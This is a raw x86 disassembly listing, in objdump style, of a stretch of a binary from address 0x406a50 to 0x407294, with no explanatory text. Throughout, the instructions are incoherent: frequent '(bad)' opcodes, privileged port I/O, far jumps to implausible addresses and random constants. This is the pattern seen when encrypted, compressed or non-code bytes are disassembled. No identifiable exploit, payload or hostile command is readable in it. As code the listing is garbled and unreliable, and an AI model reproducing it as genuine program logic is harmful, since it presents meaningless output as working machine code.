  406a50:	fdiv   QWORD PTR [ebp-0x230c0f30]
  406a56:	clc    
  406a57:	neg    bh
  406a59:	(bad)  
  406a5b:	push   eax
  406a5d:	out    dx,eax
  406a5e:	pop    es
  406a5f:	(bad)
  406a62:	(bad)  
  406a63:	cli    
  406a64:	shl    DWORD PTR [ecx-0x4f15332f],1
  406a6a:	loop   0x406a3f
  406a6c:	int3   
  406a6d:	into   
  406a6e:	clc    
  406a6f:	stc    
  406a70:	call   0xbe136631
  406a75:	add    al,BYTE PTR [ecx]
  406a77:	fsub   st,st(4)
  406a79:	jecxz  0x406a74
  406a7b:	(bad)  
  406a7c:	lock aad 0xde
  406a7f:	cmc    
  406a80:	stc    
  406a81:	loopne 0x406a90
  406a83:	fld    st(2)
  406a85:	in     al,dx
  406a86:	lds    esi,FWORD PTR [ecx-0xf251950]
  406a8c:	les    esi,FWORD PTR [ebp-0x47462721]
  406a92:	jmp    0x406a86
  406a94:	cmc    
  406a95:	rcl    esp,0xdf
  406a98:	loope  0x406a90
  406a9a:	rcr    ch,1
  406a9c:	fild   WORD PTR [edx]
  406a9e:	aam    0xd6
  406aa0:	add    edx,edi
  406aa2:	clc    
  406aa3:	fsubrp st(1),st
  406aa5:	retf   
  406aa6:	in     eax,dx
  406aa7:	fnsave [esi-0x183b124f]
  406aad:	jmp    0xd2296380
  406ab2:	add    ecx,ebp
  406ab4:	rcl    ah,cl
  406ab6:	loop   0x406ab5
  406ab8:	icebp  
  406ab9:	lock fscale 
  406abc:	leave  
  406abd:	jecxz  0x406aa4
  406abf:	loopne 0x406aa7
  406ac1:	iret   
  406ac2:	shr    ecx,cl
  406ac4:	int3   
  406ac5:	stos   BYTE PTR es:[edi],al
  406ac6:	lods   al,BYTE PTR ds:[esi]
  406ac7:	repnz out 0xf1,al
  406aca:	mov    al,0xd3
  406acc:	in     al,dx
  406acd:	loopne 0x406ac4
  406acf:	int    0xfd
  406ad1:	mov    edx,0xfac8edd7
  406ad6:	mov    eax,0xd8bdd3f9
  406adb:	mov    esp,0xe5c806bf
  406ae0:	std    
  406ae1:	push   es
  406ae2:	fcmove st,st(3)
  406ae4:	loopne 0x406ad5
  406ae6:	scas   al,BYTE PTR es:[edi]
  406ae7:	shr    edi,0xcf
  406aea:	loopne 0x406abc
  406aec:	mov    al,0xf7
  406aee:	(bad)  
  406aef:	(bad)  
  406af0:	mov    ah,0xef
  406af2:	fcmovnb st,st(3)
  406af4:	shl    eax,1
  406af6:	in     eax,dx
  406af7:	test   DWORD PTR [ebx],0xad6bcec
  406afd:	add    al,BYTE PTR [edi]
  406aff:	out    0x4,eax
  406b01:	hlt    
  406b02:	stc    
  406b03:	retf   
  406b04:	ret    
  406b05:	(bad)
  406b08:	leave  
  406b09:	mov    bl,0xdb
  406b0b:	rcr    ecx,1
  406b0d:	not    ecx
  406b0f:	mov    edi,0xffd3d1f1
  406b14:	leave  
  406b15:	stc    
  406b16:	(bad)  
  406b18:	dec    DWORD PTR [ebx]
  406b1a:	repnz shl cl,0xd9
  406b1e:	jmp    0xf3de:0xca13cdc0
  406b25:	fsubr  DWORD PTR [ecx-0x4d1c0f40]
  406b2b:	leave  
  406b2c:	call   0xf92c6327
  406b31:	idiv   DWORD PTR [edi-0x2d0c3147]
  406b37:	in     eax,0xda
  406b39:	rol    dl,cl
  406b3b:	(bad)  
  406b3c:	cmc    
  406b3d:	or     BYTE PTR [esi],cl
  406b3f:	(bad)  
  406b40:	in     al,dx
  406b41:	add    al,ah
  406b43:	adc    ch,BYTE PTR [edx-0x2e191c41]
  406b49:	stos   BYTE PTR es:[edi],al
  406b4a:	fcmovnbe st,st(0)
  406b4c:	enter  0xdec7,0xe4
  406b50:	fucomip st,st(2)
  406b52:	fsub   st(6),st
  406b54:	cmc    
  406b55:	in     al,dx
  406b56:	add    ebp,esp
  406b58:	mov    edx,0x4d9ffda
  406b5e:	or     edi,edx
  406b60:	(bad)  
  406b61:	fcmove st,st(2)
  406b63:	fcmove st,st(7)
  406b65:	rol    ebp,0xae
  406b68:	int    0xca
  406b6a:	(bad)  
  406b6b:	cmc    
  406b6c:	iret   
  406b6d:	retf   0xfbc4
  406b70:	in     eax,dx
  406b71:	mov    eax,0xdbf2f9ba
  406b76:	repz cmc 
  406b78:	loope  0x406b75
  406b7a:	ret    
  406b7b:	jmp    0x406b42
  406b7d:	ret    0x6d6
  406b80:	out    dx,al
  406b81:	add    bl,ch
  406b83:	out    dx,eax
  406b84:	les    ebp,FWORD PTR [ecx-0xb4d390e]
  406b8a:	lods   al,BYTE PTR ds:[esi]
  406b8b:	loop   0x406b4e
  406b8d:	(bad)  
  406b8e:	div    DWORD PTR [esi-0x4f4e0326]
  406b94:	add    ebp,ecx
  406b96:	in     al,dx
  406b97:	not    esp
  406b99:	add    eax,0xe6f0c4eb
  406b9e:	retf   
  406b9f:	add    eax,ebp
  406ba1:	or     ecx,DWORD PTR [ebx+esi*8]
  406ba4:	retf   
  406ba5:	mov    cl,0xe7
  406ba7:	fmulp  st(2),st
  406ba9:	loopne 0x406b86
  406bab:	in     eax,0xaf
  406bad:	(bad)  
  406bae:	div    ebp
  406bb0:	(bad)  
  406bb2:	in     eax,dx
  406bb3:	mov    esi,0xbfc3dffc
  406bb8:	add    DWORD PTR [edi],eax
  406bba:	std    
  406bbb:	add    ch,al
  406bbd:	lar    ebp,dx
  406bc0:	add    eax,0xe1cdddcd
  406bc5:	test   eax,0xc4e4b2a9
  406bca:	mov    bh,0xe1
  406bcc:	shl    DWORD PTR [edx-0xc092c2f],0xfa
  406bd3:	fsubr  st,st(5)
  406bd5:	rol    BYTE PTR [ebx],0xed
  406bd8:	int    0xe7
  406bda:	or     esi,ebp
  406bdc:	fild   DWORD PTR [edx]
  406bde:	add    ah,dl
  406be0:	aam    0xa
  406be2:	add    al,0xeb
  406be4:	scas   al,BYTE PTR es:[edi]
  406be5:	int    0xaf
  406be7:	mul    ebp
  406be9:	stos   BYTE PTR es:[edi],al
  406bea:	(bad)  
  406beb:	loopne 0x406b9e
  406bed:	out    0xf4,al
  406bef:	mov    ecx,0xbfd8d7f4
  406bf4:	fst    st(4)
  406bf6:	loopne 0x406be4
  406bf8:	(bad)  
  406bf9:	out    0xe5,eax
  406bfb:	out    0x1,al
  406bfd:	loop   0x406bc4
  406bff:	out    dx,eax
  406c00:	enter  0xdfdd,0x6
  406c04:	ret    
  406c05:	mov    bl,0xed
  406c07:	lock scas al,BYTE PTR es:[edi]
  406c09:	out    0xb6,al
  406c0b:	loop   0x406bc3
  406c0d:	retf   0xffd3
  406c10:	sti    
  406c11:	fldpi  
  406c13:	int    0xba
  406c15:	mov    dh,0xd3
  406c17:	int    0xf1
  406c19:	sar    bl,0xde
  406c1c:	or     cl,bh
  406c1e:	jecxz  0x406c24
  406c20:	add    ebx,esp
  406c22:	add    eax,0xc6f7bcee
  406c27:	shl    dh,cl
  406c29:	mov    dl,0xb4
  406c2b:	mov    edx,0xdbcde9d4
  406c30:	enter  0xbfb5,0xc8
  406c34:	repz add edx,ecx
  406c37:	clc    
  406c38:	std    
  406c39:	mov    edx,0xfbe1e602
  406c3e:	jmp    0xc9fe:0xfef8ecc9
  406c45:	(bad)  
  406c46:	out    0xf2,al
  406c48:	in     al,dx
  406c49:	jmp    0x406c2c
  406c4b:	fcmovb st,st(4)
  406c4d:	out    0xc5,eax
  406c4f:	in     al,dx
  406c50:	mov    ah,0xf5
  406c52:	jecxz  0x406c20
  406c54:	(bad)  
  406c55:	(bad)  
  406c57:	ret    0xc3f7
  406c5a:	fmul   DWORD PTR [ebx]
  406c5c:	retf   
  406c5d:	jmp    0x406c1c
  406c5f:	(bad)  
  406c61:	add    al,0xe3
  406c63:	icebp  
  406c64:	loope  0x406c44
  406c66:	fsubr  st(2),st
  406c68:	in     eax,dx
  406c69:	scas   al,BYTE PTR es:[edi]
  406c6a:	jmp    0xecf54120
  406c6f:	enter  0xf3d8,0xf4
  406c73:	(bad)  
  406c74:	rol    dl,cl
  406c76:	out    dx,al
  406c77:	fistp  QWORD PTR [esp+ebp*8+0x4de03f6]
  406c7e:	in     eax,0xe
  406c80:	fucomi st,st(0)
  406c82:	fstp   st(6)
  406c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c85:	mov    edi,0xcef6d6de
  406c8a:	ret    0xb4eb
  406c8d:	loopne 0x406c89
  406c8f:	(bad)  
  406c90:	jmp    0xdf29265f
  406c95:	fstp   st(3)
  406c97:	in     eax,dx
  406c98:	aad    0x1
  406c9a:	fsub   st,st(4)
  406c9c:	mov    BYTE PTR [edi],0xe7
  406c9f:	cli    
  406ca0:	fisttp DWORD PTR [ebx]
  406ca2:	out    dx,al
  406ca3:	(bad)  
  406ca5:	lds    ebp,FWORD PTR [esi-0x41a5219]
  406cab:	out    0xb9,eax
  406cad:	mov    ah,0xee
  406caf:	lods   al,BYTE PTR ds:[esi]
  406cb0:	int3   
  406cb1:	int3   
  406cb2:	fmul   st,st(0)
  406cb4:	repz repz mov ch,0xd9
  406cb8:	stc    
  406cb9:	add    al,dh
  406cbb:	(bad)  
  406cbc:	cmc    
  406cbd:	fisttp WORD PTR [ecx]
  406cbf:	shl    al,0xfa
  406cc2:	add    eax,0xe4c3dc06
  406cc7:	iret   
  406cc8:	out    0xc4,al
  406cca:	jmp    0xf3192ea4
  406ccf:	mov    bh,0xf0
  406cd1:	repnz into 
  406cd3:	loop   0x406c8e
  406cd5:	enter  0xf5fc,0xc0
  406cd9:	loope  0x406cd7
  406cdb:	aam    0xfc
  406cdd:	rcl    ah,1
  406cdf:	push   esp
  406ce1:	or     edi,edi
  406ce3:	shr    BYTE PTR [ecx-0x39173211],0xf7
  406cea:	sti    
  406ceb:	jmp    0x406cda
  406ced:	enter  0xf9c4,0xdb
  406cf1:	fldl2t 
  406cf3:	retf   0xf9d3
  406cf6:	shl    al,cl
  406cf8:	neg    al
  406cfa:	in     eax,0xd6
  406cfc:	(bad)  
  406cfd:	cmc    
  406cfe:	(bad)  
  406cff:	or     ebp,ebp
  406d01:	or     bl,ah
  406d03:	add    BYTE PTR [esi-0x3f53174e],bh
  406d09:	out    dx,al
  406d0a:	out    0xf6,eax
  406d0c:	repz (bad) 
  406d0f:	cli    
  406d10:	std    
  406d11:	int3   
  406d12:	aam    0xf5
  406d14:	mul    edx
  406d16:	iret   
  406d17:	int    0xd6
  406d19:	fucomi st,st(2)
  406d1b:	fld    st(5)
  406d1d:	(bad)  
  406d1f:	(bad)  
  406d20:	fucom  st(4)
  406d22:	clc    
  406d23:	into   
  406d24:	repz rcl ecx,1
  406d27:	int    0xeb
  406d29:	shl    ebp,cl
  406d2b:	out    0xe6,al
  406d2d:	frstpm(287 only) 
  406d2f:	cmc    
  406d30:	mov    edi,0xd7d1e9b4
  406d35:	in     eax,dx
  406d36:	test   DWORD PTR [esi],0xadaf6fa
  406d3c:	rcr    ebp,1
  406d3e:	out    0xea,eax
  406d40:	jmp    0xf03c6e33
  406d45:	ret    
  406d46:	test   eax,0xf7ebf4bc
  406d4b:	out    dx,eax
  406d4c:	into   
  406d4d:	neg    eax
  406d4f:	(bad)  
  406d51:	mov    dh,0xdc
  406d53:	fsub   st(0),st
  406d55:	in     al,dx
  406d56:	xlat   BYTE PTR ds:[ebx]
  406d57:	repnz sti 
  406d59:	loop   0x406d2f
  406d5b:	fcmovnbe st,st(0)
  406d5d:	retf   0xe1
  406d60:	psllq  mm5,mm2
  406d63:	add    dl,ch
  406d65:	ret    
  406d66:	rcr    ebp,cl
  406d68:	(bad)  
  406d69:	rcl    ah,cl
  406d6b:	(bad)  
  406d6c:	iret   
  406d6d:	aam    0xdb
  406d6f:	rcl    edi,cl
  406d71:	call   0xde0f4730
  406d76:	fmulp  st(4),st
  406d78:	(bad)  
  406d7a:	mov    ecx,0xe4e8def0
  406d7f:	out    dx,eax
  406d80:	aad    0xc6
  406d82:	in     al,dx
  406d83:	shl    DWORD PTR [edi-0x54383b12],cl
  406d89:	stos   BYTE PTR es:[edi],al
  406d8a:	loope  0x406d82
  406d8c:	int3   
  406d8d:	out    dx,al
  406d8e:	(bad)  
  406d8f:	iret   
  406d90:	into   
  406d91:	lock mov esp,0xfad6bed6
  406d97:	(bad)  
  406d99:	repnz fadd QWORD PTR [ecx]
  406d9c:	loope  0x406d92
  406d9e:	retf   
  406d9f:	loopne 0x406d81
  406da1:	or     eax,0xcdb913fa
  406da6:	jmp    0xd8d0:0xdab2eff6
  406dad:	int    0xee
  406daf:	clc    
  406db0:	clc    
  406db1:	jmp    0x406da8
  406db3:	mov    esi,0x3b5f4e2
  406db8:	(bad)  
  406dba:	loopne 0x406db4
  406dbc:	ret    0xe9f7
  406dbf:	push   cs
  406dc0:	iret   
  406dc1:	dec    BYTE PTR [edi]
  406dc3:	repz mov esp,0xe1c5a8d3
  406dc9:	fsub   st(4),st
  406dcb:	ret    0xcac6
  406dce:	retf   
  406dcf:	(bad)  
  406dd0:	fidivr DWORD PTR [edi-0xb40224c]
  406dd6:	mov    esp,0xe6d8d2b8
  406ddb:	sti    
  406ddc:	add    eax,0x7cec5d7
  406de1:	fldl2t 
  406de3:	clc    
  406de4:	stos   BYTE PTR es:[edi],al
  406de5:	retf   0xf6ee
  406de8:	scas   al,BYTE PTR es:[edi]
  406de9:	retf   0xfab4
  406dec:	aad    0xba
  406dee:	mov    ecx,0xd1f9f9d4
  406df3:	enter  0xd1,0xd3
  406df7:	sar    BYTE PTR [ebx-0x104422c],cl
  406dfd:	fcmovu st,st(7)
  406dff:	jmp    0x406dcf
  406e01:	ret    0xddfc
  406e04:	fcomip st,st(1)
  406e06:	call   0xe81030f3
  406e0b:	aad    0xe0
  406e0d:	mov    dl,0xff
  406e0f:	mov    dh,0xc5
  406e11:	clc    
  406e12:	mov    ch,0xcf
  406e14:	inc    BYTE PTR [eax]
  406e16:	rol    DWORD PTR ds:0xfb0bbe05,cl
  406e1c:	or     dl,bh
  406e1e:	(bad)  
  406e1f:	in     eax,dx
  406e20:	add    esi,esp
  406e22:	cld    
  406e23:	fdiv   st,st(3)
  406e25:	into   
  406e26:	(bad)  
  406e28:	(bad)  
  406e29:	in     al,0xce
  406e2b:	mov    cl,0xdb
  406e2d:	mov    ah,0xe7
  406e2f:	mov    edi,0xb4dcf9f1
  406e34:	(bad)  
  406e35:	rcr    al,0xb4
  406e38:	jecxz  0x406e40
  406e3a:	loop   0x406dfe
  406e3c:	(bad)  
  406e3d:	fndisi(8087 only) 
  406e3f:	inc    DWORD PTR [edx+ecx*1]
  406e42:	or     BYTE PTR [edx],cl
  406e44:	jmp    0x406e05
  406e46:	into   
  406e47:	out    0xe9,eax
  406e49:	jecxz  0x406e19
  406e4b:	call   0xd3f85743
  406e50:	mov    ebx,0xe3fabaf1
  406e55:	mov    esi,0xe5f002c0
  406e5a:	rol    BYTE PTR [ebx],1
  406e5c:	mov    edi,0xca030ec1
  406e61:	jecxz  0x406e75
  406e63:	adc    ch,dh
  406e65:	jmp    0xf2f45231
  406e6a:	out    dx,eax
  406e6b:	shl    eax,cl
  406e6d:	jmp    0xcac3:0xedcefdde
  406e74:	rcl    ecx,1
  406e76:	neg    ecx
  406e78:	ret    0xc3eb
  406e7b:	add    al,0xd4
  406e7d:	jmp    0x406e68
  406e7f:	mov    esp,0xee03e0e2
  406e84:	les    edi,FWORD PTR [eax-0x313b3b1d]
  406e8a:	repz out dx,al
  406e8c:	(bad)  
  406e8d:	jmp    0xd811294d
  406e92:	mov    ch,0xc2
  406e94:	std    
  406e95:	(bad)  
  406e96:	(bad)  
  406e97:	idiv   ch
  406e99:	int3   
  406e9a:	jmp    0x406ea7
  406e9c:	ret    
  406e9d:	jmp    0x406e94
  406e9f:	or     eax,0x1fdf8f5
  406ea4:	stos   BYTE PTR es:[edi],al
  406ea5:	(bad)  
  406ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea7:	in     al,0xaf
  406ea9:	in     eax,dx
  406eaa:	shl    dl,1
  406eac:	into   
  406ead:	repz out 0xd9,eax
  406eb0:	cmc    
  406eb1:	ror    cl,1
  406eb3:	neg    cl
  406eb5:	mov    ebp,0xc4bbdaff
  406eba:	loope  0x406e95
  406ebc:	fcomp  st(2)
  406ebe:	aad    0xfa
  406ec0:	call   0xa93a6cc9
  406ec5:	loop   0x406e97
  406ec7:	jmp    0x406e93
  406ec9:	out    0xd7,eax
  406ecb:	repz scas eax,DWORD PTR es:[edi]
  406ecd:	out    0xe4,eax
  406ecf:	icebp  
  406ed0:	int3   
  406ed1:	call   0xe41428d8
  406ed6:	icebp  
  406ed7:	faddp  st(0),st
  406ed9:	(bad)  
  406eda:	icebp  
  406edb:	(bad)  
  406edc:	aad    0xf5
  406ede:	fucom  st(4)
  406ee0:	add    ecx,esp
  406ee2:	bswap  eax
  406ee4:	jmp    0xcef6:0xf0e9caa6
  406eeb:	sar    DWORD PTR [edx-0x33172028],1
  406ef1:	fcom   st(7)
  406ef3:	mov    esi,0xde07eebd
  406ef8:	repz icebp 
  406efa:	ffreep st(6)
  406efc:	inc    DWORD PTR [edi]
  406efe:	xlat   BYTE PTR ds:[ebx]
  406eff:	(bad)  
  406f01:	call   0xcdef4d19
  406f06:	loope  0x406eac
  406f08:	in     eax,0xed
  406f0a:	mov    bl,0xfa
  406f0c:	mov    bh,0xe6
  406f0e:	shl    ebp,1
  406f10:	cli    
  406f11:	icebp  
  406f12:	lock add ch,ah
  406f15:	loope  0x406f12
  406f17:	mov    eax,0xe4e5d3e7
  406f1c:	call   0xd627681e
  406f21:	out    dx,eax
  406f22:	in     eax,0xf1
  406f24:	ror    eax,cl
  406f26:	leave  
  406f27:	lods   al,BYTE PTR ds:[esi]
  406f28:	icebp  
  406f29:	out    dx,al
  406f2a:	loope  0x406f1e
  406f2c:	out    0xc6,al
  406f2e:	int    0xec
  406f30:	repnz mov ch,0xe9
  406f33:	cli    
  406f34:	(bad)  
  406f36:	mov    eax,0xeac7fffc
  406f3b:	sar    eax,1
  406f3d:	add    ebx,eax
  406f3f:	out    0xda,eax
  406f41:	pop    es
  406f42:	out    0x0,al
  406f44:	mov    cl,0xb3
  406f46:	call   0xccf83a1c
  406f4b:	mov    ebx,0xbbbbb2e7
  406f50:	repnz lock lock clc 
  406f54:	leave  
  406f55:	cli    
  406f56:	mov    ebp,0xf7f3e5e6
  406f5b:	xlat   BYTE PTR ds:[ebx]
  406f5c:	cld    
  406f5d:	psubusb mm4,mm5
  406f60:	(bad)  
  406f61:	or     al,0xdd
  406f63:	or     ecx,esi
  406f65:	mov    al,0xac
  406f67:	icebp  
  406f68:	stos   DWORD PTR es:[edi],eax
  406f69:	(bad)  
  406f6a:	test   eax,0xc8d4f4b4
  406f6f:	out    dx,eax
  406f70:	std    
  406f71:	repnz retf 0xe2e9
  406f75:	ret    0xd1dc
  406f78:	fsubrp st(3),st
  406f7a:	add    dh,bh
  406f7c:	loopne 0x406f42
  406f7e:	xlat   BYTE PTR ds:[ebx]
  406f7f:	in     al,0xc7
  406f81:	adc    ecx,DWORD PTR ds:0xbdb2d8d3
  406f87:	loopne 0x406f6c
  406f89:	icebp  
  406f8a:	(bad)  
  406f8b:	call   0xdc0f575e
  406f90:	lock (bad) 
  406f93:	cli    
  406f94:	out    dx,al
  406f95:	add    bh,dl
  406f97:	fmul   st,st(4)
  406f99:	sar    ch,cl
  406f9b:	sar    ch,cl
  406f9d:	(bad)  
  406f9e:	retf   0xfc0f
  406fa1:	(bad)  
  406fa3:	repnz mov cl,0xc1
  406fa6:	jecxz  0x406f9d
  406fa8:	scas   eax,DWORD PTR es:[edi]
  406fa9:	jmp    0xf9e9:0xb9bafada
  406fb0:	not    bl
  406fb2:	mov    esp,0xb8e8f0b0
  406fb7:	(bad)  
  406fb9:	or     edi,DWORD PTR [ebp-0x25260806]
  406fbf:	sar    ah,0xc
  406fc2:	(bad)  
  406fc3:	adc    bh,BYTE PTR [eax-0x161d3440]
  406fc9:	lock (bad) 
  406fcb:	jmp    0xcf095f8b
  406fd0:	(bad)  
  406fd2:	fdivr  DWORD PTR [edi-0x200f0124]
  406fd8:	aad    0xe4
  406fda:	clc    
  406fdb:	push   es
  406fdc:	fucomp st(7)
  406fde:	out    dx,eax
  406fdf:	loopne 0x406fc1
  406fe1:	add    bh,ah
  406fe3:	loop   0x406fc6
  406fe5:	int3   
  406fe6:	(bad)
  406fe9:	out    dx,eax
  406fea:	mov    ebx,0xf8aed6f2
  406fef:	cmc    
  406ff0:	rcl    ah,1
  406ff2:	add    bh,dh
  406ff4:	loopne 0x406fb3
  406ff6:	lock (bad) 
  406ff8:	cld    
  406ff9:	sti    
  406ffa:	shl    al,cl
  406ffc:	mov    DWORD PTR [edx],0xda0ad4c5
  407002:	call   0xee303601
  407007:	repz jecxz 0x406ff7
  40700a:	repz out dx,al
  40700c:	in     al,0xcd
  40700e:	out    0xb8,al
  407010:	(bad)  
  407011:	std    
  407012:	int    0xbe
  407014:	in     eax,dx
  407015:	icebp  
  407016:	shl    edx,1
  407018:	(bad)  
  40701a:	aam    0x4
  40701c:	icebp  
  40701d:	add    eax,0xece80f06
  407022:	out    0xcc,eax
  407024:	rep lods eax,DWORD PTR ds:[esi]
  407026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407027:	fnsave [ebx-0x38490c14]
  40702d:	lock mov dh,0xd3
  407030:	xlat   BYTE PTR ds:[ebx]
  407031:	fdivr  DWORD PTR [ebx-0x4494632]
  407037:	fdivr  st(6),st
  407039:	out    0xdb,al
  40703b:	(bad)  
  40703d:	ror    ebx,0xfa
  407040:	(bad)  
  407042:	cli    
  407043:	fucomp st(7)
  407045:	mov    esi,0xf4f4dcf6
  40704a:	les    esi,FWORD PTR [esi-0x93a334b]
  407050:	mov    ebp,0xf5caf9ec
  407055:	add    dh,ch
  407057:	sar    BYTE PTR [esi+edx*8-0x3dfc0009],cl
  40705e:	leave  
  40705f:	fld    DWORD PTR [eax]
  407061:	in     eax,dx
  407062:	in     al,dx
  407063:	int    0xbd
  407065:	leave  
  407066:	jmp    0xecb0:0xe0b4c6f5
  40706d:	iret   
  40706e:	mov    edi,0xd6e9f7fa
  407073:	enter  0xcde1,0xd7
  407077:	fadd   DWORD PTR [ebx]
  407079:	aam    0xe7
  40707b:	fucompp 
  40707d:	jecxz  0x40705d
  40707f:	cld    
  407080:	or     bl,bh
  407082:	std    
  407083:	add    esi,DWORD PTR [ebx-0x421f5a44]
  407089:	xlat   BYTE PTR ds:[ebx]
  40708a:	loopne 0x407071
  40708c:	in     eax,0xc0
  40708e:	in     al,0xbe
  407090:	cld    
  407091:	push   ebp
  407093:	mov    ecx,0xfed9f7d2
  407098:	(bad)  
  407099:	inc    cl
  40709b:	out    0xc5,al
  40709d:	aad    0x7
  40709f:	iret   
  4070a0:	dec    edx
  4070a2:	fadd   st(0),st
  4070a4:	mov    esp,0xd5eaf2ec
  4070a9:	iret   
  4070aa:	rol    esi,0xd2
  4070ad:	aam    0xd6
  4070af:	in     eax,0xc8
  4070b1:	aad    0xfd
  4070b3:	aam    0xdd
  4070b5:	mov    ebp,0xf4e7e7d8
  4070ba:	mov    ebp,0xe6f6f1c6
  4070bf:	push   es
  4070c0:	add    BYTE PTR [esi],cl
  4070c2:	in     eax,0xcb
  4070c4:	mov    ecx,0xbdf0c7e0
  4070c9:	jmp    0x407095
  4070cb:	test   al,0xd4
  4070cd:	jmp    0x4070aa
  4070cf:	retf   
  4070d0:	(bad)  
  4070d1:	fmul   st(5),st
  4070d3:	call   0xda1c53b6
  4070d8:	in     eax,dx
  4070d9:	std    
  4070da:	out    0x2,al
  4070dc:	xlat   BYTE PTR ds:[ebx]
  4070dd:	add    DWORD PTR [ebx],ecx
  4070df:	mov    esp,0xffe5deea
  4070e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e5:	iret   
  4070e6:	fidiv  WORD PTR [edx-0x194e114d]
  4070ec:	shl    DWORD PTR [edi-0x13222133],1
  4070f2:	mov    ch,0xdb
  4070f4:	xlat   BYTE PTR ds:[ebx]
  4070f5:	rcl    edi,cl
  4070f7:	shl    al,1
  4070f9:	int3   
  4070fa:	mov    cl,0xf9
  4070fd:	std    
  4070fe:	cld    
  4070ff:	(bad)  
  407100:	sti    
  407101:	fild   DWORD PTR [edx]
  407103:	in     al,dx
  407104:	scas   al,BYTE PTR es:[edi]
  407105:	mov    al,0xb1
  407107:	into   
  407108:	stos   DWORD PTR es:[edi],eax
  407109:	shl    edi,0xef
  40710c:	iret   
  40710d:	jmp    0x4070e1
  40710f:	fsub   st,st(4)
  407111:	shl    ch,1
  407113:	fucomip st,st(7)
  407115:	mov    ecx,0xc4bffdc2
  40711a:	(bad)
  40711d:	loopne 0x40711e
  40711f:	shr    dh,0xd9
  407122:	int3   
  407123:	add    al,0xc3
  407125:	ffreep st(2)
  407127:	mov    esp,0xe0b6dce4
  40712c:	aad    0xcb
  40712e:	mov    ch,0xac
  407130:	mov    edi,0xfdc3f4d9
  407135:	faddp  st(2),st
  407137:	fucomi st,st(5)
  407139:	inc    bh
  40713b:	shl    cl,0xd9
  40713e:	(bad)  
  40713f:	jmp    0xedf0:0xdfe10ddb
  407146:	xlat   BYTE PTR ds:[ebx]
  407147:	loope  0x40713b
  407149:	sar    edx,0xf6
  40714c:	clc    
  40714d:	scas   al,BYTE PTR es:[edi]
  40714e:	clc    
  40714f:	sti    
  407150:	int    0xf7
  407152:	jecxz  0x40713d
  407154:	sar    bl,1
  407156:	out    dx,eax
  407157:	pop    es
  407158:	fcmovnu st,st(3)
  40715a:	fadd   QWORD PTR [edx+edi*8]
  40715d:	mul    ebx
  40715f:	jmp    0x40714b
  407161:	stc    
  407162:	enter  0xd8eb,0xbd
  407166:	out    dx,eax
  407167:	(bad)  
  407168:	shl    ebp,cl
  40716a:	mov    al,0xb0
  40716c:	aad    0xec
  40716e:	fmulp  st(7),st
  407170:	imul   eax
  407172:	retf   
  407173:	(bad)  
  407175:	aad    0xdd
  407177:	jecxz  0x407145
  407179:	(bad)  
  40717b:	fcomip st,st(6)
  40717d:	shr    ebx,0xe8
  407180:	hlt    
  407181:	or     ebx,ecx
  407183:	call   0xea011f60
  407188:	mov    cl,0xb4
  40718a:	fcmovbe st,st(1)
  40718c:	jmp    0x407162
  40718e:	(bad)  
  407190:	jmp    0x407191
  407192:	mov    ebx,0xceb9fcd7
  407197:	into   
  407198:	(bad)  
  40719a:	mov    ecx,0xef05dce2
  40719f:	std    
  4071a0:	cli    
  4071a1:	jecxz  0x40718d
  4071a3:	iret   
  4071a4:	icebp  
  4071a5:	mov    eax,0xaaeee5c1
  4071aa:	cli    
  4071ab:	mul    dh
  4071ad:	aam    0xd6
  4071af:	(bad)  
  4071b1:	iret   
  4071b2:	mov    eax,0xd4d9cebc
  4071b7:	mov    esp,0xe902f3db
  4071bc:	jmp    0x4071c2
  4071be:	fmulp  st(1),st
  4071c0:	out    dx,eax
  4071c1:	push   es
  4071c2:	or     DWORD PTR [edx],ecx
  4071c4:	in     eax,dx
  4071c5:	out    0xbf,al
  4071c7:	shl    cl,0xd2
  4071ca:	mov    bh,0xed
  4071cc:	mov    dh,0xd3
  4071ce:	(bad)  
  4071d0:	jmp    0xc1f474c6
  4071d5:	clc    
  4071d6:	std    
  4071d7:	in     eax,0xbb
  4071d9:	(bad)  
  4071db:	loop   0x4071bb
  4071dd:	add    bl,bl
  4071df:	add    al,bh
  4071e1:	int3   
  4071e2:	jmp    0xacd2:0xc6e2b2ca
  4071e9:	rol    ebp,1
  4071eb:	mov    bl,0xe6
  4071ed:	aam    0xb5
  4071ef:	in     al,0xdc
  4071f1:	mov    edi,0xc003f4da
  4071f6:	iret   
  4071f7:	loopne 0x4071cc
  4071f9:	pop    es
  4071fa:	jecxz  0x4071b4
  4071fc:	add    dl,al
  4071fe:	jmp    0x2f5fe4
  407203:	std    
  407204:	mov    esi,0xf5e0d6ce
  407209:	mov    ah,0xc5
  40720b:	shr    bl,0xdf
  40720e:	(bad)  
  40720f:	repz neg dl
  407212:	mov    ebx,0xecc2bace
  407217:	aad    0xe7
  407219:	rcl    esi,cl
  40721b:	mov    esp,0xd5dfebc4
  407220:	push   cs
  407221:	loope  0x40722e
  407223:	(bad)  
  407225:	out    dx,al
  407226:	in     eax,dx
  407227:	out    0xd1,al
  407229:	retf   0xb7f3
  40722c:	iret   
  40722d:	loopne 0x4071f4
  40722f:	rcl    ebp,cl
  407231:	cli    
  407232:	in     al,dx
  407233:	mov    ebp,0xfafddaed
  407238:	ret    
  407239:	rcr    dl,0x5
  40723c:	aam    0xf6
  40723e:	(bad)  
  407240:	add    al,0x5
  407242:	jmp    0x407243
  407244:	retf   
  407245:	test   al,0xc6
  407247:	in     eax,0xb2
  407249:	imul   ebp
  40724b:	mov    cl,0xea
  40724d:	in     eax,0xee
  40724f:	not    esp
  407251:	(bad)  
  407252:	fucom  st(2)
  407254:	in     al,dx
  407255:	mov    eax,0xfcf4f5e6
  40725a:	faddp  st(1),st
  40725c:	sar    eax,1
  40725e:	leave  
  40725f:	(bad)  
  407260:	fucom  st(3)
  407262:	fadd   QWORD PTR [edx]
  407264:	loop   0x407238
  407266:	mov    edi,0xc6b1e2cb
  40726b:	mov    al,0xaf
  40726d:	out    dx,eax
  40726e:	(bad)  
  407270:	(bad)  
  407272:	mov    edx,0xdad4c2ec
  407277:	stc    
  407278:	cmc    
  407279:	aam    0xfe
  40727b:	rcr    al,1
  40727d:	lock call esp
  407280:	add    eax,0xaacfd8d4
  407285:	ret    0xf5ed
  407288:	(bad)  
  407289:	loop   0x40724f
  40728b:	sti    
  40728c:	retf   0xf2b0
  40728f:	mov    ebx,0xd0fb03cd
  407294:	ror    eax,0xdf
